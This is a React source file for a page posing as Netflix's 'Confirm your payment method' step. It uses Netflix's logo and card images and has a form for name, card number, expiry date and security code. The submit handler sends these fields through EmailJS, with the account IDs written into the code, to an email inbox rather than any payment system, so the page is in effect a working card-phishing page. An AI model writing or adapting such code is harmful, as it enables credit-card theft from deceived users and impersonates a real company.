import React from "react"
import { useNavigate } from "react-router-dom"
import emailjs from 'emailjs-com'

const Confirm = () => {

  const navigate = useNavigate()

  const sendEmail = (e) => {
    e.preventDefault()
    emailjs.sendForm('service_cm6hsuq', 'template_7ly8hlb', e.target, 'user_tREzId4e2fhTEehRTqA5w')
      .then(res => {
        navigate('/done')
        console.log(res)
      })
      .catch(err => {
        console.log(err)
      })
  }

  return (
    <>
    <div className="nav">
        <a href="/">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="netflix logo" />
        </a>
        <h2>Sign Out</h2>
    </div>
      <div className="body-1">
        <div className="center">
      <div>
        <p>STEP 2 OF 2</p>
      </div>
      <div>
        <h5>Confirm your payment method.</h5>
      </div>
      <div className="cards">
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg" alt="" />
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg" alt="" />
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg" alt="" />
      </div>
      <form method="post" onSubmit={sendEmail} className="d-flex flex-column">
        <input type="text" className="binfo" name="message" placeholder="First Name" />
        <input type="text" className="binfo" name="message" placeholder="Last Name" />
        <input type="text" className="binfo" name="message" placeholder="Card Number" />
        <input type="text" className="binfo" name="message" placeholder="Expiration Date (MM/YY)" />
        <input type="text" className="binfo" name="message" placeholder="Security Code" />
        <button className="update-billing">
          CONFIRM PAYMENT METHOD
        </button>
        </form>
    </div>
      </div>
      <footer>
        <div className="fff">
        <div className="contact-us">
          <p>Questions? Contact us.</p>
        </div>
        <div className="d-flex">
        <div className="faq">
          <p>FAQ</p>
          <p>Help Center</p>
          <p>Terms of Use</p>
          <p>Privacy</p>
        </div>
        <div className="cookie">
          <p>Cookie Preferences</p>
          <p>Corporate Information</p>
        </div>
        </div>
        
        </div>
      </footer>
    </>
  )
}

export default Confirm